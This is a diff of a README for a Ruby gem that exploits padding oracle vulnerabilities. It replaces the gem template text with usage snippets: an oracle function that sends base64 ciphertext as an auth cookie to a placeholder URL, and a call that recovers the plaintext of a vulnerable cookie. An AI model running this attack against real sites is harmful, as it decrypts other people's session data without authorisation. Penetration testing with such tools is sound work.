@@ -1,38 +1,23 @@
 # Paddingoracle
 
-Welcome to your new gem! In this directory, you'll find the files you need to be able to package up your Ruby library into a gem. Put your Ruby code in the file `lib/paddingoracle`. To experiment with that code, run `bin/console` for an interactive prompt.
+This is a Rubyframework for exploiting padding oracle vulnerabilities based on this fantastic Python project:
 
-TODO: Delete this and the text above, and describe your gem
-
-## Installation
-
-Add this line to your application's Gemfile:
-
-```ruby
-gem 'paddingoracle'
-```
-
-And then execute:
-
-    $ bundle
-
-Or install it yourself as:
-
-    $ gem install paddingoracle
+https://github.com/mwielgoszewski/python-paddingoracle
 
 ## Usage
 
-TODO: Write usage instructions here
 
-## Development
 You will first need to extend the module with your own padding_oracle function. Example:
 
 ```
 require 'httparty'
+require 'base64'
+require 'uri'
 
 URL = 'http://google.com'
 module Paddingoracle
   def decrypt_oracle(string)
+    string = URI.escape(Base64.strict_encode64(string))
     response = HTTParty.get(URL, cookies: {auth: string})
 
     raise "Invalid padding" if response.code != 200
@@ -40,14 +25,17 @@ module Paddingoracle
 end
 ```
 
-After checking out the repo, run `bin/setup` to install dependencies. Then, run `rake test` to run the tests. You can also run `bin/console` for an interactive prompt that will allow you to experiment.
-
-To install this gem onto your local machine, run `bundle exec rake install`. To release a new version, update the version number in `version.rb`, and then run `bundle exec rake release`, which will create a git tag for the version, push git commits and tags, and push the `.gem` file to [rubygems.org](https://rubygems.org).
+You can then run the attack like this;
+```
+COOKIE = 'vulnerable encrypted data'
+bcookie = Base64.decode64(COOKIE)
+plain = Paddingoracle::recover_all_blocks(bcookie)
+puts plain
+```
 
 ## Contributing
 
-Bug reports and pull requests are welcome on GitHub at https://github.com/[USERNAME]/paddingoracle.
-
+This product was written to solve a specific problem - I'm happy to investigate bugs but this type of codebase is not suited to new features or "how to use" requests.
 
 ## License
 
